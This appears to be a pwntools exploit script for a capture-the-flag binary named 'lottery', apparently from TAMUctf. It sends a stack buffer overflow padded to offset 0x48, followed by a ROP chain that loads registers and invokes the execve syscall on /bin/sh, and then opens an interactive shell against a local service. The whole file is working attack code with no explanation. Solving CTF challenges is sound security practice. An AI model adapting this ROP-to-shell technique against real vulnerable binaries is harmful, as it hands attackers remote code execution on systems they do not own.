from pwn import *

if __name__ == "__main__":
    BIN = ELF("./lottery")

    bin_sh_str = b"/bin/sh\x00"
    writeable_base = 0x0040c328
    gets = p64(BIN.symbols["gets"])
    exit = p64(BIN.symbols["exit"])

    ret = p64(0x0040100c)
    pop_rax = p64(0x0040100b)
    pop_rdi = p64(0x00401253)
    #writeable = p64(0x0040c220) # bss section
    #writeable = p64(0x000000000040c500)
    writeable = p64(0x0040c328 + 2) #len(bin_sh_str.split(b"/")[0]))
    pop_rsi = p64(0x004018ad)
    pop_rdx = p64(0x00401255)
    syscall = p64(0x004016f9)
    #syscall = p64(0x0000000000401984)

    # openssl s_client -connect tamuctf.com:443 -servername lottery -quiet
    #io = remote("tamuctf.com", 433, ssl=True, sni=True, ssl_args={"server_hostname": "lottery"})
    io = remote("localhost", 4444)
    io.recvuntil(": ")
    

    io.sendline("3")

    payload = bin_sh_str + b"A" * (0x48 - len(bin_sh_str))
    payload += pop_rdx
    payload += p64(0)
    payload += pop_rsi
    payload += p64(0)
    payload += pop_rdi
    payload += writeable
    payload += pop_rax
    payload += p64(0x3b)
    payload += syscall
    
    print(payload + b"/bin/sh\n")

    io.sendline(payload)
    io.sendline("/bin/sh")

    io.interactive()
    io.close()
